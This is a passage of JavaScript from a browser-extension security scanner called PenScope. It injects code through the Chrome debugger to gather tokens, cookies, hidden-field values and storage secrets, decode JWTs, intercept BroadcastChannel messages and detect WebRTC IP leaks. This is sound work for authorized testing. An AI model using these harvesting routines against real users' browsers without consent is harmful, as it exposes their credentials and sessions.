          var bcrypt=str.match(/\\$2[aby]?\\$\\d{2}\\$[A-Za-z0-9.\\/]{53}/g);
          if(bcrypt)bcrypt.forEach(function(m){add("bcrypt-hash",m,source,null);});
        }
        // PGP/GPG blocks
        if(str.indexOf("-----BEGIN PGP")!==-1){var pgpEnd=str.indexOf("-----END PGP");if(pgpEnd!==-1)add("pgp-block",str.substring(str.indexOf("-----BEGIN PGP"),pgpEnd+20).substring(0,200),source,null);else add("pgp-block",str.substring(str.indexOf("-----BEGIN PGP")).substring(0,200),source,{note:"Incomplete PGP block — no END tag found"});}
        if(str.indexOf("-----BEGIN ENCRYPTED")!==-1){var pemEnd=str.indexOf("-----END ENCRYPTED");if(pemEnd!==-1)add("encrypted-pem",str.substring(str.indexOf("-----BEGIN ENCRYPTED"),pemEnd+25).substring(0,200),source,null);else add("encrypted-pem",str.substring(str.indexOf("-----BEGIN ENCRYPTED")).substring(0,200),source,{note:"Incomplete PEM block"});}
      }
      // Scan localStorage
      try{for(var i=0;i<localStorage.length;i++){var k=localStorage.key(i);scan(localStorage.getItem(k),"localStorage."+k);}}catch(e){}
      // Scan sessionStorage
      try{for(var i=0;i<sessionStorage.length;i++){var k=sessionStorage.key(i);scan(sessionStorage.getItem(k),"sessionStorage."+k);}}catch(e){}
      // Scan cookies
      try{document.cookie.split(";").forEach(function(c){var p=c.trim().split("=");if(p.length>=2)scan(p.slice(1).join("="),"cookie."+p[0].trim());});}catch(e){}
      // Scan meta tags
      try{document.querySelectorAll("meta[content]").forEach(function(m){scan(m.content,"meta."+m.name);});}catch(e){}
      // Scan data attributes
      try{document.querySelectorAll("[data-token],[data-key],[data-secret],[data-auth],[data-config],[data-payload],[data-encrypted]").forEach(function(el){
        for(var j=0;j<el.attributes.length;j++){
          var a=el.attributes[j];
          if(a.name.startsWith("data-"))scan(a.value,"dom."+a.name);
        }
      });}catch(e){}
      // Scan window globals (1 level)
      try{["config","CONFIG","settings","SETTINGS","env","ENV","appConfig","APP_CONFIG","__INITIAL_STATE__","__NEXT_DATA__","__NUXT__"].forEach(function(k){
        if(window[k]){scan(JSON.stringify(window[k]).substring(0,5000),"window."+k);}
      });}catch(e){}
      // Scan hidden inputs
      try{document.querySelectorAll("input[type=hidden]").forEach(function(inp){
        if(inp.value&&inp.value.length>16)scan(inp.value,"hidden-input."+inp.name);
      });}catch(e){}
      return JSON.stringify(blobs);
    })()`,
    returnByValue:true
  },(result)=>{
    if(chrome.runtime.lastError||!result?.result?.value)return;
    try{
      const blobs=JSON.parse(result.result.value);
      // Also scan response bodies and script findings already in state
      tab.encodedBlobs=blobs.slice(0,200);
    }catch(e){console.warn('[PenScope] detectEncodedBlobs',e.message||e);}
  });
  // Also scan API response bodies from state
  setTimeout(()=>{
    const tab2=T(tabId);
    (tab2.apiResponseBodies||[]).forEach(r=>{
      if(!r.bodyPreview)return;
      scanForEncodedInString(tab2,r.bodyPreview,"api-response:"+r.path);
    });
    (tab2.postBodies||[]).forEach(p=>{
      scanForEncodedInString(tab2,p.body,"post-body:"+p.path);
    });
    (tab2.requestHeaders||[]).forEach(rh=>{
      rh.headers.forEach(h=>{
        scanForEncodedInString(tab2,h.value,"header:"+h.name);
      });
    });
  },2000);
}

function scanForEncodedInString(tab,str,source){
  if(!str||str.length<20)return;
  const b64matches=str.match(/(?:[A-Za-z0-9+\/]{4}){5,}(?:[A-Za-z0-9+\/]{2}==|[A-Za-z0-9+\/]{3}=)?/g);
  if(b64matches)b64matches.forEach(m=>{
    if(m.length<20||/^[a-z]+$/i.test(m))return;
    const key="b64:"+m.substring(0,40);
    if(tab.encodedBlobs.find(b=>b.type.startsWith("base64")&&b.value.substring(0,40)===m.substring(0,40)))return;
    try{
      const decoded=atob(m);
      let printable=0;
      for(let i=0;i<Math.min(decoded.length,100);i++){const c=decoded.charCodeAt(i);if((c>=32&&c<=126)||c===10||c===13)printable++;}
      if(printable/Math.min(decoded.length,100)>0.7&&tab.encodedBlobs.length<200){
        tab.encodedBlobs.push({type:"base64-text",value:m.substring(0,2000),source,meta:{preview:decoded.substring(0,200),decodedLength:decoded.length},length:m.length});
      }
    }catch(e){console.warn('[PenScope] scanForEncoded',e.message||e);}
  });
}

// -------------------------------------------------------
// v5.3.1: NETWORK INTELLIGENCE — passive infrastructure mapping
// -------------------------------------------------------

function extractDNSPrefetch(tabId){
  if(!_debugTabs.has(tabId))return;
  const tab=T(tabId);
  if(tab.dnsPrefetch.length>0)return;
  chrome.debugger.sendCommand({tabId},"Runtime.evaluate",{
    expression:`(function(){
      var results=[];
      var seen={};
      document.querySelectorAll("link[rel]").forEach(function(link){
        var rel=(link.rel||"").toLowerCase();
        if(rel==="dns-prefetch"||rel==="preconnect"||rel==="preload"||rel==="prefetch"||rel==="prerender"){
          var href=link.href||link.getAttribute("href")||"";
          if(!href||seen[href])return;seen[href]=1;
          var host="";
          try{host=new URL(href).hostname;}catch(e){host=href.replace(/^.*\\/\\//,"").split("/")[0];}
          results.push({rel:rel,href:href,host:host,crossOrigin:link.crossOrigin||null,as:link.getAttribute("as")||null,type:link.type||null});
        }
      });
      document.querySelectorAll("meta[http-equiv='x-dns-prefetch-control']").forEach(function(m){
        results.push({rel:"meta-dns-control",href:null,host:null,crossOrigin:null,as:null,type:null,content:m.content});
      });
      return JSON.stringify(results);
    })()`,
    returnByValue:true
  },(result)=>{
    if(chrome.runtime.lastError||!result?.result?.value)return;
    try{tab.dnsPrefetch=JSON.parse(result.result.value);}catch(e){console.warn('[PenScope] extractDNSPrefetch',e.message||e);}
  });
}

function scanIframes(tabId){
  if(!_debugTabs.has(tabId))return;
  const tab=T(tabId);
  if(tab._iframesScanned&&tab.iframeScan.length>0)return;
  tab._iframesScanned=true;
  chrome.debugger.sendCommand({tabId},"Runtime.evaluate",{
    expression:`(function(){
      var results=[];
      var iframes=document.querySelectorAll("iframe,frame,object,embed");
      for(var i=0;i<iframes.length&&results.length<50;i++){
        var el=iframes[i];
        var tag=el.tagName.toLowerCase();
        var src=el.src||el.data||el.getAttribute("src")||"";
        var sandbox=el.getAttribute("sandbox");
        var name=el.name||el.id||"";
        var visible=el.offsetWidth>0&&el.offsetHeight>0;
        var w=el.offsetWidth;
        var h=el.offsetHeight;
        var sameOrigin=false;
        var innerContent=null;
        try{
          if(el.contentDocument){
            sameOrigin=true;
            var forms=[];
            el.contentDocument.querySelectorAll("form").forEach(function(f){forms.push({action:f.action||"",method:f.method||"GET"});});
            var inputs=[];
            el.contentDocument.querySelectorAll("input[type=hidden],input[type=password]").forEach(function(inp){inputs.push({type:inp.type,name:inp.name||"",value:inp.type==="hidden"?inp.value.substring(0,100):""});});
            var scripts=[];
            el.contentDocument.querySelectorAll("script[src]").forEach(function(s){scripts.push(s.src);});
            innerContent={forms:forms.slice(0,10),hiddenInputs:inputs.slice(0,20),scripts:scripts.slice(0,10),title:el.contentDocument.title||""};
          }
        }catch(e){}
        var allow=el.getAttribute("allow")||null;
        var csp=el.getAttribute("csp")||null;
        var referrer=el.getAttribute("referrerpolicy")||null;
        results.push({tag:tag,src:src,name:name,sandbox:sandbox,allow:allow,csp:csp,referrer:referrer,sameOrigin:sameOrigin,visible:visible,width:w,height:h,innerContent:innerContent});
      }
      return JSON.stringify(results);
    })()`,
    returnByValue:true
  },(result)=>{
    if(chrome.runtime.lastError||!result?.result?.value)return;
    try{tab.iframeScan=JSON.parse(result.result.value);}catch(e){console.warn('[PenScope] scanIframes',e.message||e);}
  });
}

function extractPerfEntries(tabId){
  if(!_debugTabs.has(tabId))return;
  const tab=T(tabId);
  if(tab.perfEntries.length>0)return;
  chrome.debugger.sendCommand({tabId},"Runtime.evaluate",{
    expression:`(function(){
      var entries=performance.getEntries();
      var results=[];
      var seen={};
      for(var i=0;i<entries.length&&results.length<300;i++){
        var e=entries[i];
        if(e.entryType==="resource"||e.entryType==="navigation"){
          var name=e.name||"";
          if(seen[name])continue;seen[name]=1;
          var host="";
          try{host=new URL(name).hostname;}catch(err){}
          var pageHost="";
          try{pageHost=location.hostname;}catch(err){}
          var isThirdParty=host&&host!==pageHost&&!host.endsWith("."+pageHost);
          results.push({
            url:name.substring(0,300),
            type:e.entryType,
            initiatorType:e.initiatorType||"",
            duration:Math.round(e.duration||0),
            transferSize:e.transferSize||0,
            encodedBodySize:e.encodedBodySize||0,
            decodedBodySize:e.decodedBodySize||0,
            host:host,
            isThirdParty:isThirdParty,
            protocol:e.nextHopProtocol||"",
            startTime:Math.round(e.startTime||0)
          });
        }
      }
      results.sort(function(a,b){return a.startTime-b.startTime;});
      return JSON.stringify(results);
    })()`,
    returnByValue:true
  },(result)=>{
    if(chrome.runtime.lastError||!result?.result?.value)return;
    try{tab.perfEntries=JSON.parse(result.result.value);}catch(e){console.warn('[PenScope] extractPerfEntries',e.message||e);}
  });
}

function extractCSSContent(tabId){
  if(!_debugTabs.has(tabId))return;
  const tab=T(tabId);
  if(tab.cssContent.length>0)return;
  chrome.debugger.sendCommand({tabId},"Runtime.evaluate",{
    expression:`(function(){
      var results=[];
      var seen={};
      function addUrl(url,source,type){
        if(!url||url==="none"||url.startsWith("data:image/svg")||url.length<5)return;
        url=url.replace(/^url\\(["']?/,"").replace(/["']?\\)$/,"");
        if(!url||url==="none"||seen[url])return;
        seen[url]=1;
        var isInternal=false;
        try{isInternal=new URL(url,location.href).hostname===location.hostname;}catch(e){}
        var isData=url.startsWith("data:");
        var dataInfo=null;
        if(isData){
          var semiIdx=url.indexOf(";");
          var commaIdx=url.indexOf(",");
          var endIdx=semiIdx>5?semiIdx:(commaIdx>5?commaIdx:url.length);
          var mime=url.substring(5,endIdx).toLowerCase();
          dataInfo={mime:mime||"unknown",size:url.length};
        }
        results.push({url:isData?url.substring(0,200):url,source:source,type:type,isInternal:isInternal,isData:isData,dataInfo:dataInfo});
      }
      // Walk all stylesheets
      try{
        for(var i=0;i<document.styleSheets.length&&results.length<200;i++){
          var sheet=document.styleSheets[i];
          var sheetHref=sheet.href||"inline";
          try{
            var rules=sheet.cssRules||sheet.rules;
            if(!rules)continue;
            for(var j=0;j<rules.length&&results.length<200;j++){
              var rule=rules[j];
              // @import rules
              if(rule.type===3&&rule.href){addUrl(rule.href,sheetHref,"@import");}
              // @font-face
              if(rule.type===5&&rule.style){
                var fontSrc=rule.style.getPropertyValue("src")||"";
                var fontUrls=fontSrc.match(/url\\(["']?[^)"']+["']?\\)/g);
                if(fontUrls)fontUrls.forEach(function(u){addUrl(u,sheetHref,"@font-face");});
              }
              // Regular rules with background/content
              if(rule.style){
                var bg=rule.style.getPropertyValue("background-image")||rule.style.getPropertyValue("background")||"";
                var bgUrls=bg.match(/url\\(["']?[^)"']+["']?\\)/g);
                if(bgUrls)bgUrls.forEach(function(u){addUrl(u,sheetHref+">"+(rule.selectorText||"rule"),"background-image");});
                var content=rule.style.getPropertyValue("content")||"";
                if(content&&content!=="none"&&content!=="normal"&&content!=='""'&&content!=="''"){
                  var contentUrls=content.match(/url\\(["']?[^)"']+["']?\\)/g);
                  if(contentUrls)contentUrls.forEach(function(u){addUrl(u,sheetHref+">"+(rule.selectorText||"rule"),"content");});
                  if(!contentUrls&&content.length>5&&content!=="counter(item)"){
                    results.push({url:content.substring(0,200),source:sheetHref+">"+(rule.selectorText||"rule"),type:"content-text",isInternal:false,isData:false,dataInfo:null});
                  }
                }
                var listImg=rule.style.getPropertyValue("list-style-image")||"";
                if(listImg&&listImg!=="none"){addUrl(listImg,sheetHref+">"+(rule.selectorText||"rule"),"list-style-image");}
                var cursor=rule.style.getPropertyValue("cursor")||"";
                var cursorUrls=cursor.match(/url\\(["']?[^)"']+["']?\\)/g);
                if(cursorUrls)cursorUrls.forEach(function(u){addUrl(u,sheetHref+">"+(rule.selectorText||"rule"),"cursor");});
              }
            }
          }catch(e){}
        }
      }catch(e){}
      // Also check inline styles with background-image
      try{
        document.querySelectorAll("[style]").forEach(function(el){
          var s=el.getAttribute("style")||"";
          var urls=s.match(/url\\(["']?[^)"']+["']?\\)/g);
          if(urls)urls.forEach(function(u){addUrl(u,"inline-style>"+el.tagName.toLowerCase()+(el.id?"#"+el.id:""),"inline-background");});
        });
      }catch(e){}
      return JSON.stringify(results);
    })()`,
    returnByValue:true
  },(result)=>{
    if(chrome.runtime.lastError||!result?.result?.value)return;
    try{tab.cssContent=JSON.parse(result.result.value);}catch(e){console.warn('[PenScope] extractCSS',e.message||e);}
  });
}

// -------------------------------------------------------
// v5.2: DEEP PASSIVE ANALYSIS — no requests, pure observation
// -------------------------------------------------------

// Library noise patterns — paths from known third-party libraries, not app routes
const LIBRARY_NOISE=[/^\/Dialog$/,/^\/Message$/,/^\/unread$/,/^\/tagged$/,/^\/complete$/,/^\/strophe/,/^\/regex$/,/^\/MATH$/,/^\/Wiris/i,/^\/pluginwiris/,/^\/wirispluginengine/,/^\/java-java/,/^\/service$/,/^\/showimage$/,/^\/createimage$/,/^\/password\/reset$/,/^\/blobs$/,/^\/file$/,/^\/find$/,/^\/status$/,/^\/getblobobjectbyid$/,/^\/app$/,/^\/-/,/^\/[a-z]$/,/^\/\w+\.\w+$/];

// JWT decoder
function decodeJWT(token){
  try{
    const parts=token.split(".");
    if(parts.length!==3)return null;
    const header=JSON.parse(atob(parts[0].replace(/-/g,"+").replace(/_/g,"/")));
    const payload=JSON.parse(atob(parts[1].replace(/-/g,"+").replace(/_/g,"/")));
    const exp=payload.exp?new Date(payload.exp*1000):null;
    const iat=payload.iat?new Date(payload.iat*1000):null;
    const isExpired=exp?exp<new Date():false;
    const weakAlgo=["none","HS256"].includes(header.alg);
    return{header,payload,expiry:exp?.toISOString()||null,issuedAt:iat?.toISOString()||null,isExpired,weakAlgorithm:weakAlgo,algorithm:header.alg||"?",claims:Object.keys(payload),hasUserInfo:!!(payload.sub||payload.email||payload.name||payload.user_id||payload.userId),hasClaims:!!(payload.role||payload.roles||payload.scope||payload.permissions||payload.groups)};
  }catch(e){return null;}
}

// Scan all findings for JWTs and decode them
function decodeAllJWTs(tabId){
  const tab=T(tabId);
  const jwtRegex=/eyJ[A-Za-z0-9_-]{10,}\.eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]+/g;
  const foundJWTs=new Set();
  const results=[];

  function scanForJWTs(text,source){
    if(!text)return;
    for(const match of text.matchAll(jwtRegex)){
      const token=match[0];
      if(foundJWTs.has(token))continue;
      foundJWTs.add(token);
      const decoded=decodeJWT(token);
      if(decoded)results.push({token:token.substring(0,80)+"...",source,...decoded});
    }
  }

  // Scan cookies
  (tab.cookies||[]).forEach(c=>scanForJWTs(c.value,"cookie:"+c.name));
  // Scan storage
  Object.entries(tab.storageData?.local||{}).forEach(([k,v])=>scanForJWTs(v,"localStorage:"+k));
  Object.entries(tab.storageData?.session||{}).forEach(([k,v])=>scanForJWTs(v,"sessionStorage:"+k));
  // Scan secrets
  (tab.secrets||[]).forEach(s=>{if(s.type==="JWT"||s.type==="Bearer Token")scanForJWTs(s.value,"secret:"+s.type);});
  // Scan response bodies
  (tab.responseBodies||[]).forEach(r=>{if(r.pattern==="Auth token")scanForJWTs(r.value,"response:"+r.url);});
  // Scan script source findings
  (tab.scriptSources||[]).forEach(s=>{if(s.pattern==="Hardcoded JWT")scanForJWTs(s.value,"script:"+s.scriptUrl);});
  // Scan request headers
  (tab.requestHeaders||[]).forEach(r=>r.headers.forEach(h=>{if(h.name.toLowerCase()==="authorization")scanForJWTs(h.value,"header:"+r.url);}));
  // Scan runtime secrets
  (tab.runtime?.runtimeSecrets||[]).forEach(s=>{if(s.type==="JWT")scanForJWTs(s.value,"runtime:"+s.path);});
  // Scan hidden fields
  (tab.hiddenFields||[]).forEach(f=>scanForJWTs(f.value,"hidden:"+f.name));

  tab.jwtFindings=results;
}

// v5.6 WASM binary analysis — runs server-side when Network.getResponseBody returns base64-encoded
// WASM. No page-context re-fetch, no URL-interpolation hazards, no race with existing modules.
function processWasmBinary(tabId,url,b64body,status,mimeType){
  const tab=T(tabId);
  let bin;
  try{bin=atob(b64body);}catch(e){console.warn('[PenScope] wasm atob',e.message||e);return;}
  const size=bin.length;
  if(size<8)return;
  // WASM magic: \0asm version 1
  const magic=bin.charCodeAt(0)===0x00&&bin.charCodeAt(1)===0x61&&bin.charCodeAt(2)===0x73&&bin.charCodeAt(3)===0x6d;
  if(!magic)return;
  let hex="";
  for(let i=0;i<Math.min(size,512);i++){
    const h=bin.charCodeAt(i).toString(16);
    hex+=(h.length<2?"0":"")+h+" ";
    if((i+1)%16===0)hex+="\n";
  }
  // Extract printable-string runs and look for toolchain/crypto/mining signatures.
  // This works because WASM Custom Sections (name, producers, target_features, etc.) store
  // human-readable strings that directly reveal how the module was built.
  const signatures=[];const strings=[];let run="";let cryptoHit=false;let miningHit=false;let toolchain=null;
  const scanLimit=Math.min(size,400000);
  for(let i=0;i<scanLimit;i++){
    const c=bin.charCodeAt(i);
    if(c>=32&&c<=126)run+=String.fromCharCode(c);
    else{
      if(run.length>=4){
        if(strings.length<200)strings.push(run);
        if(/sha(?:256|512)|\baes\b|\brsa\b|hmac|pbkdf|scrypt|argon|bcrypt|chacha|ed25519|secp256|ecdsa/i.test(run))cryptoHit=true;
        if(/stratum|hashrate|coinbase|CryptoNight|RandomX|minexmr|monero|webchain|coinhive/i.test(run))miningHit=true;
        if(/wasm-bindgen|emscripten|AssemblyScript|rustc|rustwasm|Rust v|LLVM|clang version|tinygo|golang/i.test(run)){
          if(signatures.length<20)signatures.push(run.substring(0,80));
          if(!toolchain){
            if(/wasm-bindgen/i.test(run))toolchain="Rust (wasm-bindgen)";
            else if(/emscripten/i.test(run))toolchain="Emscripten (C/C++)";
            else if(/AssemblyScript/i.test(run))toolchain="AssemblyScript";
            else if(/rustc|Rust v|rustwasm/i.test(run))toolchain="Rust";
            else if(/tinygo|golang/i.test(run))toolchain="Go (TinyGo)";
            else if(/LLVM|clang/i.test(run))toolchain="LLVM/Clang";
          }
        }
      }
      run="";
    }
  }
  // Count functions and memory sections via simple byte walker
  let funcCount=0,importCount=0,exportCount=0;
  try{
    let p=8; // skip magic + version
    while(p<size-1){
      const sectId=bin.charCodeAt(p);p++;
      // Read LEB128 section length
      let sectLen=0,shift=0;
      while(p<size){
        const b=bin.charCodeAt(p);p++;
        sectLen|=(b&0x7f)<<shift;
        if(!(b&0x80))break;
        shift+=7;if(shift>35)break;
      }
      if(sectId===2)importCount=sectLen;       // Import section exists
      else if(sectId===3)funcCount=sectLen;    // Function section exists
      else if(sectId===7)exportCount=sectLen;  // Export section exists
      p+=sectLen;
      if(p>size)break;
    }
  }catch(e){}
  const magicHex=[];
  for(let i=0;i<8;i++)magicHex.push(("0"+bin.charCodeAt(i).toString(16)).slice(-2));
  const existing=tab.wasmModules.find(w=>w.url===url);
  const entry={
    url,size,fullSize:size,
    source:"network-body",
    status,mimeType,
    hexDump:hex.substring(0,2048),
    magic:magicHex.join(" "),
    toolchain:toolchain||"unknown",
    signatures:signatures.slice(0,10),
    patterns:{crypto:cryptoHit,mining:miningHit,obfuscated:strings.length<5,signatures:signatures.slice(0,5)},
    topStrings:strings.filter(s=>s.length>=6).slice(0,30),
    timestamp:Date.now()
  };
  if(existing){Object.assign(existing,entry);}
  else if(!seen(tabId,"wasm",url))tab.wasmModules.push(entry);
}

// v5.4/5.6: WASM module detection + capability probe. Binary analysis now happens in
// processWasmBinary (server-side, from Network.getResponseBody). This function only detects
// which modules exist and which WebAssembly/WebGPU features the runtime supports.
function detectWasmModules(tabId){
  if(!_debugTabs.has(tabId))return;
  const tab=T(tabId);
  chrome.debugger.sendCommand({tabId},"Runtime.evaluate",{
    expression:`(function(){
      var results=[];
      try{
        var entries=performance.getEntriesByType("resource");
        entries.forEach(function(e){
          if(e.name&&(e.name.endsWith(".wasm")||e.name.indexOf(".wasm?")>-1))
            results.push({url:e.name,size:e.transferSize||0,duration:Math.round(e.duration),type:"network"});
        });
      }catch(e){}
      try{
        var caps={type:"capability",wasmSupported:false,streaming:false,simd:false,threads:false,exceptions:false,gc:false,webgpu:false,webgpuAdapter:null};
        if(typeof WebAssembly!=="undefined"){
          caps.wasmSupported=true;
          caps.streaming=typeof WebAssembly.instantiateStreaming==="function";
          try{caps.simd=WebAssembly.validate(new Uint8Array([0,97,115,109,1,0,0,0,1,5,1,96,0,1,123,3,2,1,0,10,10,1,8,0,65,0,253,15,253,98,11]));}catch(e){caps.simd=false;}
          try{caps.threads=typeof SharedArrayBuffer!=="undefined"&&WebAssembly.validate(new Uint8Array([0,97,115,109,1,0,0,0,1,4,1,96,0,0,3,2,1,0,5,4,1,3,1,1,10,11,1,9,0,65,0,254,16,2,0,26,11]));}catch(e){caps.threads=false;}
        }
        if(typeof navigator!=="undefined"&&navigator.gpu){
          caps.webgpu=true;
          try{
            navigator.gpu.requestAdapter().then(function(adapter){
              if(adapter){
                caps.webgpuAdapter={vendor:adapter.info?.vendor||"",architecture:adapter.info?.architecture||"",device:adapter.info?.device||"",description:adapter.info?.description||"",features:[],limits:{}};
                adapter.features.forEach(function(f){caps.webgpuAdapter.features.push(f);});
                var limitKeys=["maxTextureDimension1D","maxTextureDimension2D","maxBufferSize","maxComputeWorkgroupSizeX","maxComputeInvocationsPerWorkgroup"];
                limitKeys.forEach(function(k){if(adapter.limits[k]!==undefined)caps.webgpuAdapter.limits[k]=adapter.limits[k];});
              }
            }).catch(function(){});
          }catch(e){}
        }
        results.push(caps);
      }catch(e){}
      return JSON.stringify(results);
    })()`,
    returnByValue:true
  },(result)=>{
    if(chrome.runtime.lastError||!result?.result?.value)return;
    try{
      const modules=JSON.parse(result.result.value);
      modules.forEach(m=>{
        if(m.url&&!tab.wasmModules.find(w=>w.url===m.url)){
          tab.wasmModules.push({url:m.url,size:m.size||0,duration:m.duration||0,source:"performance-api",timestamp:Date.now()});
        }
        if(m.type==="capability"&&!tab.wasmModules.find(x=>x.type==="capability")){
          tab.wasmModules.push({type:"capability",wasmSupported:m.wasmSupported,streaming:m.streaming||false,simd:m.simd||false,threads:m.threads||false,webgpu:m.webgpu||false,webgpuAdapter:m.webgpuAdapter||null,source:"runtime-check"});
          if(m.webgpu)tab.webgpuInfo={supported:true,adapter:m.webgpuAdapter,timestamp:Date.now()};
        }
      });
    }catch(e){console.warn('[PenScope] wasmDetect',e.message||e);}
  });
  const scripts=_scripts[tabId];
  if(scripts){
    for(const[,info]of scripts){
      if(info.url&&(info.url.endsWith(".wasm")||info.url.includes("wasm"))&&!tab.wasmModules.find(w=>w.url===info.url)){
        tab.wasmModules.push({url:info.url,source:"debugger-parsed",type:"script-reference",timestamp:Date.now()});
      }
    }
  }
}

// v5.4: BroadcastChannel monitoring via CDP
function hookBroadcastChannels(tabId){
  if(!_debugTabs.has(tabId))return;
  const tab=T(tabId);
  chrome.debugger.sendCommand({tabId},"Runtime.evaluate",{
    expression:`(function(){
      try{
        if(typeof BroadcastChannel==="undefined")return JSON.stringify({supported:false});
        var OrigBC=BroadcastChannel;
        var intercepted=[];
        var channels=[];
        var knownNames=new Set();
        window.BroadcastChannel=function(name){
          var ch=new OrigBC(name);
          knownNames.add(name);
          var origOnMsg=null;
          Object.defineProperty(ch,"onmessage",{
            set:function(fn){
              origOnMsg=fn;
              ch.addEventListener("message",function(e){
                try{
                  var preview=typeof e.data==="string"?e.data.substring(0,500):JSON.stringify(e.data).substring(0,500);
                  if(!window.__ps_bc)window.__ps_bc=[];
                  if(window.__ps_bc.length<200)window.__ps_bc.push({channel:name,data:preview,timestamp:Date.now()});
                }catch(err){}
                if(origOnMsg)origOnMsg.call(ch,e);
              });
            },
            get:function(){return origOnMsg;}
          });
          return ch;
        };
        window.BroadcastChannel.prototype=OrigBC.prototype;
        var commonNames=["auth","session","user","login","token","sync","state","data","update","notification","cache","worker","sw","broadcast","refresh","logout","tab-sync","heartbeat","presence","messaging"];
        commonNames.forEach(function(name){
          try{
            var ch=new OrigBC(name);
            ch.onmessage=function(e){
              var preview=typeof e.data==="string"?e.data.substring(0,500):JSON.stringify(e.data).substring(0,500);
              intercepted.push({channel:name,data:preview,timestamp:Date.now()});
            };
            channels.push(ch);
            knownNames.add(name);
          }catch(e){}
        });
        setTimeout(function(){channels.forEach(function(ch){try{ch.close();}catch(e){}});},8000);
        return JSON.stringify({probed:commonNames.length,channels:[...knownNames],intercepted:intercepted});
      }catch(e){return JSON.stringify({error:e.message});}
    })()`,
    returnByValue:true
  },(result)=>{
    if(chrome.runtime.lastError||!result?.result?.value)return;
    try{
      const data=JSON.parse(result.result.value);
      if(data.channels&&!seen(tabId,"bc","probe")){
        tab.broadcastChannels.push({type:"probe",channelsProbed:data.probed,channelNames:data.channels||[],timestamp:Date.now()});
      }
      if(data.intercepted)data.intercepted.forEach(m=>{
        if(!seen(tabId,"bc-msg",m.channel+":"+m.data.substring(0,30)))
          tab.broadcastChannels.push({type:"message",channel:m.channel,data:m.data,timestamp:m.timestamp});
      });
    }catch(e){console.warn('[PenScope] broadcastChannel',e);}
  });
  setTimeout(()=>{
    if(!_debugTabs.has(tabId))return;
    chrome.debugger.sendCommand({tabId},"Runtime.evaluate",{
      expression:`(function(){try{return JSON.stringify(window.__ps_bc||[]);}catch(e){return "[]";}})()`,
      returnByValue:true
    },(result)=>{
      if(chrome.runtime.lastError||!result?.result?.value)return;
      try{
        const msgs=JSON.parse(result.result.value);
        msgs.forEach(m=>{
          if(!seen(tabId,"bc-msg",m.channel+":"+m.data.substring(0,30)))
            tab.broadcastChannels.push({type:"message",channel:m.channel,data:m.data,timestamp:m.timestamp});
        });
      }catch(e){}
    });
  },10000);
}

// v5.4: WebRTC IP leak detection via CDP
function detectWebRTCLeaks(tabId){
  if(!_debugTabs.has(tabId))return;
  const tab=T(tabId);
  chrome.debugger.sendCommand({tabId},"Runtime.evaluate",{
    expression:`new Promise(function(resolve){
      try{
        if(typeof RTCPeerConnection==="undefined"){resolve(JSON.stringify({supported:false}));return;}
        var ips=[];
        var pc=new RTCPeerConnection({iceServers:[{urls:"stun:stun.l.google.com:19302"}]});
        pc.createDataChannel("");
        pc.createOffer().then(function(offer){return pc.setLocalDescription(offer);}).catch(function(){});
        pc.onicecandidate=function(ice){
          if(!ice||!ice.candidate||!ice.candidate.candidate){
            pc.close();
            resolve(JSON.stringify({supported:true,leaks:ips}));
            return;
          }
          var parts=ice.candidate.candidate.split(" ");
          for(var i=0;i<parts.length;i++){
            var p=parts[i];
            if(/^\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}$/.test(p)){
              var isPrivate=/^(?:10\\.|172\\.(?:1[6-9]|2\\d|3[01])\\.|192\\.168\\.|127\\.0\\.)/.test(p);
              if(ips.findIndex(function(x){return x.ip===p;})<0)ips.push({ip:p,type:isPrivate?"private":"public"});
            }
            if(p.includes(":")){
              var v6match=p.match(/([0-9a-f]{1,4}(?::[0-9a-f]{1,4}){2,7})/i);
              if(v6match&&ips.findIndex(function(x){return x.ip===v6match[1];})<0)ips.push({ip:v6match[1],type:"ipv6"});
            }
          }
        };
        setTimeout(function(){try{pc.close();}catch(e){}resolve(JSON.stringify({supported:true,leaks:ips,timeout:true}));},8000);
      }catch(e){resolve(JSON.stringify({error:e.message}));}
    })`,
    awaitPromise:true,
    returnByValue:true,
    timeout:15000
  },(result)=>{
    if(chrome.runtime.lastError||!result?.result?.value)return;
    try{
      const data=JSON.parse(result.result.value);
      if(data.leaks&&data.leaks.length>0&&!seen(tabId,"webrtc","leaks")){
        data.leaks.forEach(leak=>{
          tab.webrtcLeaks.push({ip:leak.ip,type:leak.type,source:"stun-leak",timestamp:Date.now()});
        });
      }
    }catch(e){console.warn('[PenScope] webrtcLeak',e);}
  });
}

function detectCoopCoep(tabId){
  if(!_debugTabs.has(tabId))return;
  const tab=T(tabId);
  chrome.debugger.sendCommand({tabId},"Runtime.evaluate",{
    expression:`(function(){
      var info={coop:null,coep:null,corp:null,crossOriginIsolated:false,sharedArrayBuffer:false,features:[]};
      try{
        info.crossOriginIsolated=!!self.crossOriginIsolated;
        info.sharedArrayBuffer=typeof SharedArrayBuffer!=="undefined";
        if(info.crossOriginIsolated)info.features.push("Cross-origin isolated");
        if(info.sharedArrayBuffer)info.features.push("SharedArrayBuffer available");
        if(typeof performance!=="undefined"&&performance.measureUserAgentSpecificMemory)info.features.push("measureUserAgentSpecificMemory available");
        try{new SharedArrayBuffer(1);info.features.push("SharedArrayBuffer constructible");}catch(e){info.features.push("SharedArrayBuffer blocked: "+e.message);}
        var hasCOOP=false,hasCOEP=false;
        if(document.querySelector("meta[http-equiv]")){
          document.querySelectorAll("meta[http-equiv]").forEach(function(m){
            var equiv=(m.getAttribute("http-equiv")||"").toLowerCase();
            if(equiv==="cross-origin-opener-policy"){info.coop=m.content;hasCOOP=true;}
            if(equiv==="cross-origin-embedder-policy"){info.coep=m.content;hasCOEP=true;}
            if(equiv==="cross-origin-resource-policy")info.corp=m.content;
          });
        }
        if(!hasCOOP)info.features.push("No COOP header detected (via meta)");
        if(!hasCOEP)info.features.push("No COEP header detected (via meta)");
        if(!info.crossOriginIsolated&&!hasCOOP&&!hasCOEP)info.features.push("Site NOT cross-origin isolated \u2014 Spectre attacks possible, storage partitioning may apply");
      }catch(e){info.features.push("Detection error: "+e.message);}
      return JSON.stringify(info);
    })()`,
    returnByValue:true
  },(result)=>{
    if(chrome.runtime.lastError||!result?.result?.value)return;
    try{tab.coopCoepInfo=JSON.parse(result.result.value);}catch(e){console.warn('[PenScope] coopCoep',e);}
  });
}

// Classify and filter discovered routes
function classifyAndFilterRoutes(tabId){
  const tab=T(tabId);
  const observedPaths=new Set(tab.endpoints.map(e=>e.path));

  tab.discoveredRoutes.forEach(r=>{
    // Mark if it was actually observed in traffic
    r.observed=observedPaths.has(r.path);
    // Filter library noise
